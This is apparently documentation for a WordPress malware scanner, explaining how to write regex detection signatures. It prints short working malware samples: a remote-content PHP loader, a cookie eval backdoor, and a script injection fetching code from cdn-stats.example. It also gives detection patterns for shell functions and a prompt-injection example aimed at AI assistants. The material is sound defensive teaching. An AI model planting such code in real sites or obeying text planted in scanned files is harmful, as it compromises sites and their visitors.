# Writing malware signatures for Elderward

Elderward ships with built-in signatures for known malware campaigns. When you find something they miss — a backdoor planted on this site, a new injection, a spam campaign in the database — you can write your own **custom signature** so every later scan looks for it too, on this site and on any other site you import it into.

This guide covers what a signature can see, how to write one that catches the threat without flagging clean code, how to test it, and how to share it. You need no programming beyond reading the malicious sample and, for the stronger rules, a little regular-expression syntax.

> **Custom signatures only detect.** A match is reported as a finding; nothing is ever cleaned, rewritten or deleted because of a custom signature — not on the admin page, not in a real `wp elderward scan` run. Cleanup stays with the built-in signatures and with you.

**Contents**

1. [Before you start](#1-before-you-start)
2. [A first signature in five minutes](#2-a-first-signature-in-five-minutes)
3. [What a signature is made of](#3-what-a-signature-is-made-of)
4. [What each target sees](#4-what-each-target-sees)
5. [Conditions: text and regex](#5-conditions-text-and-regex)
6. [From a sample to a rule](#6-from-a-sample-to-a-rule)
7. [Testing](#7-testing)
8. [Severity and description](#8-severity-and-description)
9. [Sharing signatures](#9-sharing-signatures)
10. [Writing signatures with an AI assistant](#10-writing-signatures-with-an-ai-assistant)
11. [Worked examples](#11-worked-examples)
12. [Troubleshooting](#12-troubleshooting)
13. [Built-in signatures (contributors)](#13-built-in-signatures-contributors)

---

## 1. Before you start

- **Have a sample.** A signature is written from real malicious content: a file the scan flagged (for example `UPLOADS_PHP` or `INTEGRITY_EXTRA`), an injected option value, a post with a planted script. On a finding, **Download sample** saves the file in a zip encrypted with the password `infected`, so neither your antivirus nor a double-click sets it off.
- **Handle samples as live malware.** Read them in a plain text editor. Never open them in a browser, never run them, never upload them to a site.
- **Write rules from your own samples.** Do not copy signatures from commercial scanners: their rule sets are usually proprietary. A rule you derive from the code in front of you is yours to share.
- **Know what a signature cannot do.** It finds content that is *already known*. A clean scan does not prove a clean site, and a rule written for one variant may miss the next one.

## 2. A first signature in five minutes

Say the scan found `wp-content/uploads/2026/04/cache.php`, and the file starts like this:

```php
<?php /* acme_loader 2.1 */ $c = @file_get_contents(get_option('acme_cdn')); @file_put_contents(__DIR__ . '/.cache.php', $c); @include __DIR__ . '/.cache.php';
```

1. Go to **Elderward > Signatures** and fill in **Add a signature**:
   - **Name:** `acme-loader`
   - **Looks in:** Files
   - **Severity:** HIGH
   - **Description:** `ACME loader backdoor`
   - **Conditions:**
     ```
     text: acme_loader
     regex: /file_put_contents\s*\([^;]{0,100}\.php['"]\s*,/i
     ```
2. Under **Try signatures**, put the file's path (`wp-content/uploads/2026/04/cache.php`) and click **Try**: `custom.acme-loader` must be listed.
3. Try a clean file of the same kind, for example `wp-includes/functions.php`: `custom.acme-loader` must **not** be listed.
4. Click **Add signature**, then start a new scan. The file now also reports:

```
HIGH,SIGNATURE_MATCH,…/cache.php,custom.acme-loader: ACME loader backdoor (custom signature, report only)
```

That is the whole loop: sample → conditions → try on the bad file and a good file → save → scan.

Why this sample: Elderward's **built-in detection** already reports the generic backdoor shapes on its own, as `MALWARE_FOUND` (code or commands taken from the request, `eval` of `base64_decode` output, password-gated shells, known shell families, PHP behind an image header, and more; the Signatures tab lists them). This loader reads no request input and decodes nothing, so it slips past them. That is where a custom signature earns its place: code the built-ins miss, and a family you want named in the findings.

## 3. What a signature is made of

| Field | Rules | What it is for |
|---|---|---|
| **Name** (`id`) | 2–63 characters: lowercase letters, digits, `.`, `-`, `_`; starts with a letter or digit; unique | Findings show it as `custom.<name>`. Pick something you will recognise in a report: `acme-loader`, `spam-casino-2026`. |
| **Looks in** (`target`) | `file`, `db_option` or `db_post` | Where the scanner applies it ([section 4](#4-what-each-target-sees)). |
| **Severity** | `HIGH`, `MEDIUM` or `LOW` | How the finding is ranked ([section 8](#8-severity-and-description)). |
| **Description** | Up to 300 characters | Printed with every match. Say what it is, not how it is detected. |
| **Conditions** (`match`) | Files: 1–10 conditions, **all** must match | [Section 5](#5-conditions-text-and-regex). |
| **Pattern** (`pattern`) | Database targets: one regex | Same regex rules as file conditions. |
| **Status** (`enabled`) | On or off | A disabled signature is kept but not used, handy while you investigate a false positive. |

Up to 200 custom signatures per site. Changes apply from the **next** scan.

## 4. What each target sees

### Files (`file`)

- **Which files:** files under the WordPress folder whose extension is one of `php`, `php3`–`php8`, `phtml`, `pht`, `phps`, `inc`, `js`, `css`, `htm`, `html`, `shtml`, `tpl`, `tmpl`, `asp`, `aspx`, `asa`, `cfm`, `cgi`, `pl`, `py`, `sh`, `conf`, `cron`, `local`, `mod`, `sct`, `ejl`, `cin`, `izo`. The Elderward plugin folder itself is never scanned (its own signature strings would match).
- **Size:** files over **2 MB** are not read. Each one is reported as `FILE_TOO_LARGE` instead (`ERROR` for PHP, `INFO` otherwise), so you can see what was not checked.
- **Content:** the whole file as raw bytes. Nothing is decoded first: a rule sees `eval(base64_decode(...))` as written, not what the base64 contains. (The built-in detection set gets a second look at files nothing matched, with comments removed, `'ev'.'al'`-style fragments joined and letter escapes decoded; custom signatures always see the raw bytes.)
- **One finding per file:** signatures are tried in order, built-in first (the cleanup signatures, then the built-in detection set), and the **first one that matches wins**. If a built-in signature already catches a file, your custom one does not report it again. Built-in detection goes first on purpose: a custom rule, even a mistaken one, can never re-label a file the built-ins call HIGH.
- **Finding:** `SIGNATURE_MATCH` with your severity, the file path, and `custom.<name>: <description> (custom signature, report only)`.
- **Other extensions:** malware sometimes hides PHP in a file named `.ico` or `.png` and includes it from elsewhere. The admin scan does not read those; the command-line scanner does with `allfiles=1` (see [section 7](#7-testing)). The `include` line that loads them is usually in a scanned file, so a rule on that line works everywhere.

### Database options (`db_option`)

- **Which values:** every row of the options table, the first **256 KB** of each value, as stored (serialized PHP stays serialized; Elderward never unserializes it).
- **Not covered by custom signatures:** `siteurl`, `home`, `active_plugins` and the `…user_roles` option. They have dedicated checks (`DB_SITE_URL`, `DB_ACTIVE_PLUGIN`, `DB_ROLE_CAPS`).
- **Finding:** `DB_OPTION_IOC` at `db:<options table>:<option name>`, with an excerpt of about 200 characters around the match. One finding per option; built-in signatures are tried first.
- Good for: injected `<script>` tags in widget or theme options, spam links in text widgets, cron-like options storing code.

### Database posts (`db_post`)

- **Which values:** the content (`post_content`, first **256 KB**) of every post, page and custom post type, **except revisions**. Titles, excerpts and post meta are not scanned.
- **Cost:** with at least one custom post signature, the scan reads every post (in pages, so memory stays flat). Without one, it only reads posts that contain code-like markers such as `<?php`, `eval(`, `atob(` or `<iframe`.
- **Finding:** `DB_POST_IOC` at `db:<posts table>:ID=<id>`, naming the post type and title. After 100 flagged posts, further ones are counted but not listed.
- Good for: SEO spam links, injected scripts or iframes, cloaked redirects pasted into content.

## 5. Conditions: text and regex

In the editor, write one condition per line, starting with `text:` or `regex:`. In JSON, a condition is `{"string": "…"}` or `{"regex": "…"}`.

### `text:` — exact text

```
text: acme_loader
```

- Matches those exact bytes anywhere in the file. **Case-sensitive**, no wildcards, at least 3 characters.
- The fastest kind of check. Use it for the most distinctive literal in the sample: an unusual function or variable name, a marker comment, a domain.

### `regex:` — a pattern

```
regex: /eval\s*\(\s*base64_decode\s*\(\s*\$_(POST|GET|REQUEST|COOKIE)/i
```

- A PHP (PCRE) regular expression **with delimiters** (`/…/`, `#…#`, `@…@`) and optional flags after the closing one: `i` (ignore case), `s` (`.` also matches newlines), `m` (`^`/`$` per line), `x` (ignore whitespace in the pattern), `u` (UTF-8).
- Choose a delimiter that does not occur in the pattern: `@https?://evil\.example/@i` reads better than escaping every `/`.
- Escape the regex metacharacters you mean literally: `\.` `\(` `\)` `\[` `\$` `\?` `\*` `\+` `\|` `\{`.

### How a file signature decides

- **Every** condition must match (AND). For "this OR that", use alternation inside one regex: `/(?:shell_exec|passthru|proc_open)\s*\(/`.
- The **first** condition is the prefilter: it runs on every scanned file, and the others only run on files that passed it. Make it a short, distinctive `text:` so scans stay fast. A regex first works, but costs time on every file of the site.
- Database signatures have a single regex (`pattern`); a value matches when it matches.

### What is refused when you save

| Problem | Why |
|---|---|
| The regex does not compile | A broken pattern would silently never match. The message says which condition. |
| The regex matches an empty file | `/.*/`, `/x?/`, `/(a|)/`… would flag every file and every row. |
| Text shorter than 3 characters | Too common to mean anything. |
| More than 10 conditions, or 2000+ characters | Keep rules readable; split them instead. |
| Not valid UTF-8 | Paste text, not binary. |

### Fail closed

If a regex hits PHP's backtracking limit on some file, PHP gives up and the condition counts as **not matched** for that file: a slow pattern never flags a file by accident, but it can **miss** one. [Section 6](#6-from-a-sample-to-a-rule) shows how to keep patterns fast.

## 6. From a sample to a rule

### Step 1: separate what is stable from what changes

Read the sample and sort its parts:

- **Changes between copies:** random variable names (`$a8f2k`), the payload itself (long base64 or hex blobs), file names, dates, the attacker's comment headers when they rotate them.
- **Stays the same:** the decoding chain (`eval(gzinflate(base64_decode(`), how input is read (`$_POST['k']`, `$_COOKIE[...]`), unusual function or marker names, a fixed domain, a distinctive structure (a long `chr()` concatenation, `create_function` with an encoded body).

Build the rule from the stable parts. A rule that matches the payload blob catches exactly one file.

### Step 2: pick the prefilter

The best first condition is a literal that is **in every copy and rare everywhere else**:

| Prefilter | Verdict |
|---|---|
| `text: acme_loader` | Good: a made-up name nobody else uses. |
| `text: evil-cdn.example/s.js` | Good: the attacker's domain. |
| `text: base64_decode` | Poor: hundreds of legitimate plugins call it, so every one of them goes on to the slower checks. |
| `text: <?php` | Useless: every PHP file. |

If nothing literal is stable, start with the most specific regex you can and keep it simple.

### Step 3: confirm the behaviour with a regex

Add one or two regex conditions that describe what makes the code malicious, so the prefilter alone cannot cause a false positive:

```
text: acme_loader
regex: /\$_(?:POST|GET|REQUEST|COOKIE)\s*\[/            # reads attacker input
regex: /(?:eval|assert)\s*\(\s*(?:base64_decode|gzinflate|str_rot13)\s*\(/i   # runs decoded code
```

(Comments are shown here for explanation; the editor does not accept them.)

### Step 4: tolerate the easy variations

Attackers and their tools reformat code:

- Allow whitespace: `eval\s*\(` instead of `eval(`.
- Ignore case where PHP does (function names): add `/i`.
- Allow both quote styles: `['"]`.
- Allow obvious alternatives with alternation: `(?:eval|assert)`, `\$_(?:POST|GET|REQUEST|COOKIE)`.

Do not try to catch every possible obfuscation in one regex. Two clear signatures beat one unreadable one.

### Step 5: keep it narrow enough

Patterns that look malicious but are common in clean code:

| Pattern alone | Where it is legitimate |
|---|---|
| `eval(` | Minified JavaScript, template engines, some page builders |
| `base64_decode(` | Image handling, licence checks, email, API clients |
| `document.write(` | Old ad and analytics snippets |
| `<iframe` | Video embeds |
| `String.fromCharCode` | Minified libraries |
| `$_POST[` | Every form handler |

They are fine as *one* of several conditions, never as the only one.

### Step 6: keep it fast

- Prefer bounded repeats: `[^;]{0,200}` instead of `.*`.
- Avoid nested quantifiers such as `(a+)+`, `(.*)*` or `(\w+\s*)*`: on long files they can make PHP give up ([fail closed](#fail-closed)) and miss the file.
- Do not start a pattern with `.*`; anchor it on a literal instead.
- The `s` flag plus `.*` across a 2 MB file is slow; bound it.

### Step 7: escaping in JSON

In the editor you type the regex as is. In a JSON file every backslash is doubled:

| Editor | JSON |
|---|---|
| `regex: /eval\s*\(/i` | `{"regex": "/eval\\s*\\(/i"}` |
| `regex: @casino-bonus\.example@i` | `"pattern": "@casino-bonus\\.example@i"` |

## 7. Testing

Every signature needs two tests before it goes into a scan: it **must match** the malicious sample, and it **must not match** a clean file of the same kind.

### In the admin

**Elderward > Signatures > Try signatures** runs the built-in and custom signatures against:

- **A file on this site**: a path from the WordPress folder, such as `wp-content/plugins/acme/loader.php` (not `wp-config.php`, and at most 2 MB), or
- **A pasted sample**: any text.

It lists the matching signatures by name (`custom.` for yours). Nothing is saved, and only names come back, never content.

Good negative tests:

- For a PHP rule: `wp-includes/functions.php`, `wp-includes/class-wpdb.php`, and the main file of a large, legitimate plugin you use.
- For a JavaScript rule: `wp-includes/js/jquery/jquery.min.js` and a minified file of your theme.
- For a database rule: paste a normal widget, a normal post with embeds.

### Against a whole clean install (command line)

The strongest negative test: scan a fresh WordPress (plus the plugins and theme the site uses) with only your signatures and expect no `SIGNATURE_MATCH`:

```
php wp-content/plugins/elderward/bin/elderward.php dryrun=1 signatures=my-signatures.json scandirectory=/path/to/clean-wordpress
```

Then the site itself, report-only:

```
php wp-content/plugins/elderward/bin/elderward.php dryrun=1 signatures=my-signatures.json scandirectory=/path/to/site
php wp-content/plugins/elderward/bin/elderward.php dryrun=1 allfiles=1 signatures=my-signatures.json scandirectory=/path/to/site   # every extension
```

`dryrun=1` keeps the run report-only. Custom signatures never clean anyway, but the same run also applies the built-in cleanup signatures, which do.

### After saving

Start a scan from **Elderward > Scan**. If your rule finds more than you expected, switch it off (**Disable**) while you look at the extra findings, rather than marking them all as false positives.

## 8. Severity and description

| Severity | Use it when | Example |
|---|---|---|
| **HIGH** | A match is malicious on its own; the response is "clean this now" | A backdoor that runs code from a request |
| **MEDIUM** | Suspicious; someone must look before acting | An unknown script loaded from a third-party domain |
| **LOW** | Worth knowing, rarely urgent | Spam links in old posts |

HIGH findings set the scan's exit code to 3 in WP-CLI and the standalone scanner, which is what cron jobs and monitoring alert on. Reserve it for rules you trust.

The **description** is what the person reading the report sees. Write what was found and why it matters, for example `ACME loader backdoor: runs PHP sent in the k POST field`. Do not write how it was detected (`matches eval + base64`).

## 9. Sharing signatures

- **Export:** **Import and export > Export custom signatures** downloads `elderward-signatures-<date>.json` with all your signatures, enabled or not.
- **Import:** paste a file's content under **Import**. Signatures with the same name are replaced, new ones added. If any entry is invalid, **nothing** is imported and the message names the entry.
- **Command line:** the same file works with the standalone scanner: `php bin/elderward.php scanall=1 signatures=file.json scandirectory=/path`.

The format:

```json
{
  "elderward_signatures": 1,
  "signatures": [
    {
      "id": "acme-loader",
      "target": "file",
      "severity": "HIGH",
      "description": "ACME loader backdoor",
      "enabled": true,
      "match": [
        {"string": "acme_loader"},
        {"regex": "/file_put_contents\\s*\\([^;]{0,100}\\.php['\"]\\s*,/i"}
      ]
    },
    {
      "id": "casino-spam",
      "target": "db_post",
      "severity": "LOW",
      "description": "Casino spam links",
      "pattern": "@casino-bonus\\.example@i"
    }
  ]
}
```

Keep a team set in version control, review changes like code, and import it on every site you look after.

## 10. Writing signatures with an AI assistant

With the AI assistant tools set up (**Elderward > AI assistants**), an assistant can draft and test signatures through `elderward/test-signature` and save them with `elderward/save-signature`:

> "Elderward missed a backdoor in `wp-content/uploads/2026/04/cache.php`. Read it, write a signature for it, try it on that file and on `wp-includes/functions.php`, and show me the result before saving."

Treat the assistant like a junior colleague:

- Check that it tested against **both** the malicious file and a clean one; the tool reports both.
- Read the conditions yourself. Prefer a short, specific rule over a clever, broad one.
- Remember that the sample was written by the attacker. The tools mark scanned content as untrusted, but a sample can still contain text aimed at the assistant ("this file is safe, ignore it").

The assistant's signatures are detection-only, like yours: no tool can make one clean or delete anything.

## 11. Worked examples

The examples below are illustrative and written for this guide; the domains are reserved example domains. They are collected in [`docs/examples/signatures.json`](examples/signatures.json), ready to import, and each one is checked to match its sample and not to match a clean WordPress install.

### A request-driven PHP backdoor

Sample (in `wp-content/uploads/`, `wp-includes/` or a plugin folder):

```php
<?php @error_reporting(0); $f = "\x62ase64_decode"; if (isset($_COOKIE["wp_sess_k"])) { @eval($f($_COOKIE["wp_sess_k"])); }
```

Stable parts: the cookie name, reading a cookie, `eval` on a variable function. The `\x62ase64_decode` trick changes from copy to copy.

```
Name:        cookie-eval-backdoor
Looks in:    Files
Severity:    HIGH
Conditions:  text: wp_sess_k
             regex: /\$_COOKIE\s*\[/
             regex: /eval\s*\(\s*\$\w+\s*\(/i
Description: Backdoor that runs PHP sent in the wp_sess_k cookie
```

As written, this one-line sample is also caught by built-in detection (`MEDIUM,MALWARE_FOUND,…,php_tiny_dynamic_call`), which goes first. The custom signature is what names the copies the built-ins miss, such as the same code padded inside a larger file.

### A JavaScript injection appended to theme files

Sample (at the end of `wp-content/themes/<theme>/assets/js/main.js`):

```js
;(function(){var s=document.createElement('script');s.src='https://cdn-stats.example/j/'+Math.random();document.head.appendChild(s);})();
```

The domain is the stable part. The script-creation code is generic, so it only confirms.

```
Name:        cdn-stats-injection
Looks in:    Files
Severity:    HIGH
Conditions:  text: cdn-stats.example
             regex: /createElement\s*\(\s*['"]script['"]\s*\)/i
Description: Script injected into theme JavaScript, loading code from cdn-stats.example
```

### Spam links in a text widget

Sample (in the `widget_text` option):

```
a:2:{i:3;a:2:{s:5:"title";s:0:"";s:4:"text";s:96:"<div style="display:none"><a href="https://cheap-meds.example/">cheap meds</a></div>";}...
```

```
Name:        hidden-spam-links
Looks in:    Database options
Severity:    MEDIUM
Pattern:     @<div[^>]{0,80}display\s*:\s*none[^>]{0,80}>\s*<a\s[^>]{0,200}href=["']https?://[^"']{0,100}(?:meds|casino|loan)@i
Description: Hidden links to spam sites in an option (SEO spam)
```

A hidden link alone is not proof (some themes hide navigation), hence MEDIUM and the keyword list.

### A redirect script pasted into posts

Sample (in `post_content`):

```html
<script>if(document.referrer.indexOf('google')>-1){window.location='https://landing.example/?r=1'}</script>
```

```
Name:        referrer-redirect
Looks in:    Database posts
Severity:    HIGH
Pattern:     @document\.referrer[^<]{0,200}(?:window|document)\.location@i
Description: Script in post content that redirects visitors coming from search engines
```

## 12. Troubleshooting

**"regex does not compile"** — usually missing delimiters (`eval\(` instead of `/eval\(/`), an unescaped `(`, `[` or `/`, or a delimiter that also appears in the pattern. Switch to `@…@` or `#…#`.

**"regex matches an empty file"** — every part of the pattern is optional (`*`, `?`, an empty alternative). Make at least one part mandatory.

**"Another custom signature already uses that id"** — names are unique. Edit the existing one, or pick a new name.

**The signature matches in Try signatures but the scan does not report it:**

- The scan started before you saved: changes apply from the next scan.
- The signature is disabled.
- A built-in signature matched the same file first ([one finding per file](#files-file)): look for a `MALWARE_FOUND` finding on it.
- The file's extension is not scanned, or it is over 2 MB and reported as `FILE_TOO_LARGE` ([section 4](#4-what-each-target-sees)).
- The regex engine gave up on that file: the scan reports `SIGNATURE_ERROR` naming your signature and the limit it hit. Nested repeats (`(a+)+`, `(\w+\s?)*`) and long unbounded runs (`.*` across a big one-line file) are the usual cause. Bound the repeats (`{0,200}`) or make them possessive (`++`, `*+`).
- The file was marked as a false positive and has not changed since: look under **False positives**.
- For posts: the text is in the title or in post meta, which are not scanned.
- For options: it is `siteurl`, `home`, `active_plugins` or the user roles option.

**It does not match a file you are sure is infected:**

- `text:` is case-sensitive; use a regex with `/i`.
- The file is encoded differently from your sample (another layer of base64, string concatenation): write a second signature for that variant.
- The pattern is too slow on that file and PHP gave up ([fail closed](#fail-closed)): bound the repeats.

**It flags clean files:** the prefilter is too common, or a condition is a generic function call. Add a condition only the malware has, or narrow the regex. Disable the signature while you fix it.

## 13. Built-in signatures (contributors)

Built-in signatures live in `Signatures::builtin_cleanup()`, `builtin_db_options()` and `builtin_db_posts()` in `includes/engine/signatures.php`. Unlike custom ones, a built-in file signature can **clean**:

```php
'javascript_example' => array(
    'prefilter' => array('string' => 'example-malware-marker'),      // cheap, on every file
    'triggers'  => array(array('regex' => '/eval\(example_\w+\(/')), // all must also match
    'action'    => array('remove_regex' => '/eval\(example_\w+\([^;]+;/s'),
    // or 'action' => array('delete_file' => true),
),
```

- `remove_regex` deletes every match from the file (written atomically). It must remove something, or the run reports `CLEANUP_FAILED`. Make it remove the injection only, never the legitimate code around it.
- `delete_file` is only for files that are malicious as a whole (a dropped shell), never for an infected legitimate file.
- Every pattern is compile-checked before a scan (`Signatures::lint()`), and `dryrun` covers both actions.
- A new built-in signature needs a fixture and a test: a positive case (infected file cleaned correctly, file still valid) and a negative case (a clean file with similar code left alone), in `tests/regress.sh` or the `TESTPLAN.md` fixtures, and `tests/regress.sh` must still pass.
- Write it from samples you are allowed to use, and describe the campaign in the signature name and a comment.

See [README: Adding signatures](../README.md#adding-signatures) for the rest of the engine's rules.
